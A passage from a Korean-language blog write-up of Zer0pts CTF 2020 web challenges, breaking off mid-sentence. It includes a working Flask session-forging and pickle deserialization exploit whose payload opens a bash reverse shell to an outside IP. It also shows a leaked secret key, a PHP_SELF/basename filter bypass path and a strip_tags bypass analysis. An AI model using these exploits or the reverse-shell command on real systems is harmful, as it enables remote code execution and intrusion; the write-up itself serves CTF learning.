class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 에러 페이지를 확인해보면 <code>Referer</code> 헤더를 가져와서 <code>URL</code> 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/1.png?raw=true"><br>그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 <code>session</code>을 마음대로 조작이 가능할 거 같습니다.</p><p><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 <code>savedata</code>라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/2.png?raw=true"><br>Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.</p><p>그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<a href="int:id">int:id</a>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. </p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">  app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line">  app.secret_key = key_</span><br><span class="line">  </span><br><span class="line">  sscsi = SecureCookieSessionInterface()</span><br><span class="line">  signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line">  </span><br><span class="line">  session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line">  print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line">  requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line">  exploit()</span><br></pre></td></tr></table></figure><p>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 <code>nc</code>를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 <code>bash -c</code>를 이용해서 쉘을 따주니 잘 되었습니다.<br><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/notepad/3.png?raw=true"><br>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</p><blockquote><p>FLAG : zer0pts{fl4sk_s3ss10n_4nd_pyth0n_RCE}</p></blockquote><hr><h2 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h2><blockquote><p>Can you guess it 문제는 PHP 트릭류 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#631F9C">&#62;</span> analysis</p><p>FLAG는 config.php에 정의가 되어 있다고 합니다.</p><p>코드를 보면 <code>$_SERVER[&#39;PHP_SELF&#39;]</code>의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. <code>$_SERVER[&#39;PHP_SELF&#39;]</code>는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 preg_match() 함수를 이용해서 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 <code>config.php</code>가 필터링에 걸리기 때문에 힘들 거 같습니다.</p><p>그러다 구글링을 하다가 <a href="https://ngaa.tistory.com/m/46?category=776250">여기서</a> 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p>테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.</p><p><span style="color:#631F9C">&#62;</span> Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure><p>위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.</p><blockquote><p>FLAG : zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}</p></blockquote><hr><h2 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h2><blockquote><p>urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다.</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">&quot;flag&quot;</span>, File.read(<span class="string">&quot;flag.txt&quot;</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">&quot;H*&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다.</p><p>그래서 value 값을 redis.call(‘get’,’flag’)를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다.</p><p>다시 풀어 더 정확한 풀이를 남기겠습니다.</p><hr><h2 id="Web-MusicBlog-653pts"><a href="#Web-MusicBlog-653pts" class="headerlink" title="(Web) MusicBlog [653pts]"></a>(Web) MusicBlog [653pts]</h2><p>MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/1.png?raw=true"><br><br>회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/2.png?raw=true"><br>Post를 작성해주니 이상한 점은 <code>좋아요</code>를 눌러주지 않았는데 <code>좋아요</code>가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.</p><p><span style="color:#631F9C">&#62;</span> post.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">            &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">            &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> util.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">// [[URL]] → &lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  <span class="variable">$str</span> = strip_tags(<span class="variable">$str</span>, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/Zer0pts%20CTF%202020/MusicBlog/3.png?raw=true"><br>위 사진을 보면 <code>&lt;a/udio&gt;</code>라는 문자열이 들어와도 <code>&lt;audio&gt;</code>로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.</p><p><span style="color:#631F9C">&#62;</span> worker.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>아까 Post를 생성하면 <code>좋아요</code>가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 